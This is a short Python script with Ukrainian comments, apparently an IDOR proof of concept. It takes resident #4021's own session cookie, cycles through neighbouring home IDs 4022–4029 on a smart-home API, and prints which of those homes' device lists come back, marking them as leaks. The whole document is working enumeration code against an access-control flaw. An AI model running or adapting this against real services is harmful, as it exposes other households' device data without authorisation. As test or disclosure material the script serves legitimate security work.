# idor_sweep.py — перебір чужих домів під ВЛАСНОЮ сесією мешканця #4021
import os, httpx

BASE = "https://api.dh.example"
cookies = {"session": os.environ["DH_SESSION"]}   # чесний вхід #4021

def probe(client, home_id):
    r = client.get(f"{BASE}/api/homes/{home_id}/devices", cookies=cookies)
    if r.status_code != 200:
        return home_id, r.status_code, 0
    return home_id, 200, len(r.json())            # та сама сесія на КОЖЕН id

with httpx.Client() as client:
    mine = 4021
    for home_id in range(mine + 1, mine + 9):     # сусіди, яких ми не маємо бачити
        hid, status, n = probe(client, home_id)
        leak = "  ← ВИТІК" if status == 200 else ""
        print(f"home {hid}: {status}  devices={n}{leak}")
